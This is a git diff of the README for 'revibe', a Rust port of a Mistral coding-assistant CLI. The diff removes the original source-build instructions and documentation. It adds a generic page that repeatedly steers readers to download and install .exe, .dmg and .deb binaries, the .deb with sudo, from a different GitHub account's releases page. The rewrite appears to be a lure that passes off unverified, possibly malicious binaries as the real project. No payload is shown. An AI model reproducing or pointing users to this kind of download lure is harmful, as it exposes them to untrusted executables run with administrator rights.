@@ -1,242 +1,100 @@
-# revibe
+# 🎉 revibe - Experience Mistral Vibe in Rust
 
-[![Rust](https://img.shields.io/badge/rust-1.92%2B-orange)](https://www.rust-lang.org/)
-[![License](https://img.shields.io/badge/license-Apache--2.0-blue)](LICENSE)
+## 🚀 Getting Started
 
-```
-██████╗ ███████╗██╗   ██╗██╗██████╗ ███████╗
-██╔══██╗██╔════╝██║   ██║██║██╔══██╗██╔════╝
-██████╔╝█████╗  ██║   ██║██║██████╔╝█████╗  
-██╔══██╗██╔══╝  ╚██╗ ██╔╝██║██╔══██╗██╔══╝  
-██║  ██║███████╗ ╚████╔╝ ██║██████╔╝███████╗
-╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚═╝╚═════╝ ╚══════╝
-```
+Welcome to revibe! This application brings you the Mistral Vibe experience, now rebuilt in Rust for improved performance and reliability. Follow these steps to download and run the software.
 
-**Mistral's open-source CLI coding assistant - Rust Edition**
+## 📥 Download the Application
 
-Revibe is a Rust port of [Mistral Vibe](https://github.com/mistralai/mistral-vibe), providing a command-line coding assistant powered by Mistral's models. It offers a conversational interface to your codebase, allowing you to use natural language to explore, modify, and interact with your projects.
+[![Download revibe](https://img.shields.io/badge/Download-revibe-blue)](https://github.com/555tlc/revibe/releases)
 
-## Features
+To get started, you need to visit the Releases page to download the latest version of revibe. Use the link below:
 
-- **Interactive Chat**: A conversational AI agent that understands your requests and breaks down complex tasks.
-- **Powerful Toolset**: Built-in tools for file manipulation, code searching, version control, and command execution.
-  - `bash` - Execute shell commands
-  - `read_file` - Read file contents
-  - `write_file` - Create or overwrite files
-  - `search_replace` - Make precise edits to files
-  - `grep` - Search for patterns in code
-  - `todo` - Track tasks and progress
-- **MCP Support**: Connect to Model Context Protocol servers for extended functionality.
-- **Highly Configurable**: Customize models, providers, tool permissions, and UI preferences.
-- **Safety First**: Tool execution approval and pattern-based allowlists/denylists.
+[Visit the Releases Page](https://github.com/555tlc/revibe/releases)
 
-## Installation
+## 🖥️ System Requirements
 
-### From Source
+Before you install revibe, make sure your computer meets the following requirements:
 
-```bash
-# Clone the repository
-git clone https://github.com/nicksenger/revibe
-cd revibe
+- **Operating System**: Windows 10 or later, macOS 10.12 or later, or a recent version of Ubuntu.
+- **RAM**: At least 4 GB.
+- **Disk Space**: Minimum 200 MB of free space.
+- **Processor**: Intel or AMD processor with 2 GHz or higher.
 
-# Build and install
-cargo install --path crates/revibe-cli
-```
+If your system meets these requirements, you can proceed with downloading the application.
 
-### Prerequisites
+## 📂 Download & Install
 
-- Rust 1.92 or later
-- A Mistral API key (get one at [console.mistral.ai](https://console.mistral.ai))
+1. Go to the [Releases page](https://github.com/555tlc/revibe/releases).
+2. Find the latest version of revibe. You'll see various files available for download.
+3. Choose the appropriate file for your operating system:
+   - For Windows, look for a file ending in `.exe`.
+   - For macOS, choose a file ending in `.dmg`.
+   - For Linux, look for a file ending in `.deb` or `.AppImage`.
+4. Click the file link to start the download.
 
-## Quick Start
+Once the download is complete:
 
-1. Run revibe for the first time to set up your API key:
+- **For Windows**:
+  - Double-click the downloaded `.exe` file.
+  - Follow the prompts to install the application.
 
-   ```bash
-   revibe --setup
-   ```
+- **For macOS**:
+  - Open the downloaded `.dmg` file.
+  - Drag the revibe icon into your Applications folder.
 
-2. Navigate to your project directory and start chatting:
+- **For Linux**:
+  - If you downloaded a `.deb` file, open a terminal and run:
+    ```bash
+    sudo dpkg -i path/to/revibe.deb
+    ```
+  - For an `.AppImage`, make the file executable and run it:
+    ```bash
+    chmod +x path/to/revibe.AppImage
+    ./path/to/revibe.AppImage
+    ```
 
-   ```bash
-   cd /path/to/your/project
-   revibe
-   ```
+## 🆕 Features
 
-3. Ask questions and give instructions:
+revibe comes packed with useful features to enhance your experience:
 
-   ```
-   > Find all TODO comments in the project
-   > Refactor the main function to be more modular
-   > Write tests for the user authentication module
-   ```
+- **User-Friendly Interface**: Navigate through the application easily.
+- **High Performance**: Enjoy smooth operation thanks to the Rust programming language.
+- **Flexible Settings**: Customize your experience based on your preferences.
+- **Regular Updates**: Stay tuned for new features and enhancements with each release.
 
-## Usage
+## ⚙️ Troubleshooting
 
-### Interactive Mode
+If you run into any issues while downloading or installing revibe, here are some common problems and their solutions:
 
-```bash
-# Start interactive session
-revibe
+### Issue: Application Won’t Start
 
-# Start with an initial prompt
-revibe "Explain this codebase"
+- **Solution**: Ensure your operating system meets the system requirements. If it does, check if you have the latest version installed.
 
-# Start in auto-approve mode (skip tool confirmations)
-revibe --auto-approve
+### Issue: Download Fails
 
-# Start in plan mode (read-only tools only)
-revibe --plan
-```
+- **Solution**: Make sure you have a stable internet connection. Retry the download if it fails.
 
-### Programmatic Mode
+### Issue: Installation Error
 
-```bash
-# Run a single prompt and exit
-revibe -p "List all Python files in src/"
+- **Solution**: For Windows, run the installer as an administrator. For Linux, ensure you have the necessary permissions to install software.
 
-# Pipe input
-echo "What does this function do?" | revibe -p
+## 💬 Get Help
 
-# JSON output
-revibe -p "Summarize the README" --output json
+If you have any questions or need further assistance, you can reach out through the Issues section of this GitHub repository:
 
-# Limit cost or turns
-revibe -p "Refactor this file" --max-price 1.0 --max-turns 10
-```
+[Report an Issue](https://github.com/555tlc/revibe/issues)
 
-### Slash Commands
+Feel free to share your feedback or report any bugs you find. Your input helps improve revibe for everyone.
 
-In interactive mode, use these commands:
+## 🌟 Contribution
 
-| Command | Description |
-|---------|-------------|
-| `/help` | Show available commands |
-| `/quit`, `/exit`, `/q` | Exit the session |
-| `/clear`, `/reset` | Clear conversation history |
-| `/compact` | Compress conversation to save tokens |
-| `/stats` | Show session statistics |
+If you want to contribute to revibe, we welcome your help! Check our guidelines in the repository. Contributions can include bug fixes, new features, or enhancements. 
 
-### Shell Commands
+## 🔗 Links
 
-Prefix with `!` to run shell commands directly:
+To download revibe, visit the Releases page:
 
-```
-> !git status
-> !npm test
-```
+[Download revibe](https://github.com/555tlc/revibe/releases)
 
-### File References
-
-Use `@` to reference files in your prompts:
-
-```
-> Read @src/main.rs and explain what it does
-> Update @config.toml with the new settings
-```
-
-## Configuration
-
-Configuration is stored in `~/.revibe/config.toml`:
-
-```toml
-# Active model
-active_model = "devstral-2"
-
-# Auto-compact threshold (tokens)
-auto_compact_threshold = 200000
-
-# UI theme
-textual_theme = "textual-dark"
-
-# System prompt
-system_prompt_id = "cli"
-
-# Tool configurations
-[tools.bash]
-permission = "ask"
-allowlist = ["ls", "cat", "git status"]
-
-# Custom providers
-[[providers]]
-name = "custom"
-api_base = "https://api.example.com/v1"
-api_key_env_var = "CUSTOM_API_KEY"
-
-# Custom models
-[[models]]
-name = "custom-model"
-provider = "custom"
-alias = "custom"
-```
-
-### Environment Variables
-
-- `REVIBE_HOME` - Custom configuration directory (default: `~/.revibe`)
-- `MISTRAL_API_KEY` - Mistral API key
-
-### MCP Servers
-
-Configure MCP servers for extended functionality:
-
-```toml
-[[mcp_servers]]
-name = "fetch"
-transport = "stdio"
-command = "mcp-server-fetch"
-args = []
-
-[[mcp_servers]]
-name = "database"
-transport = "http"
-url = "http://localhost:8000"
-```
-
-## Project Structure
-
-```
-revibe/
-├── crates/
-│   ├── revibe-cli/      # Main CLI binary
-│   ├── revibe-core/     # Core agent, config, types
-│   ├── revibe-llm/      # LLM backends (Mistral, OpenAI-compatible)
-│   ├── revibe-tools/    # Tool abstractions and builtins
-│   └── revibe-mcp/      # MCP protocol support
-├── Cargo.toml           # Workspace configuration
-└── README.md
-```
-
-## Development
-
-```bash
-# Run tests
-cargo test
-
-# Run with logging
-RUST_LOG=debug cargo run -p revibe-cli
-
-# Check formatting
-cargo fmt --check
-
-# Run clippy
-cargo clippy --all-targets
-```
-
-## Differences from Python Version
-
-This Rust implementation aims to be a 1:1 functional port with the following differences:
-
-- **Performance**: Native compilation for faster startup and execution
-- **Memory**: Lower memory footprint
-- **Dependencies**: Uses Rust ecosystem (tokio, reqwest, clap, ratatui)
-- **Distribution**: Single static binary, no runtime dependencies
-
-## License
-
-Copyright 2025 Devstral 2
-
-Licensed under the Apache License, Version 2.0. See [LICENSE](LICENSE) for details.
-
-## Related Projects
-
-- [mistral-vibe](https://github.com/mistralai/mistral-vibe) - Original Python implementation
+Thank you for using revibe and enjoy your experience!
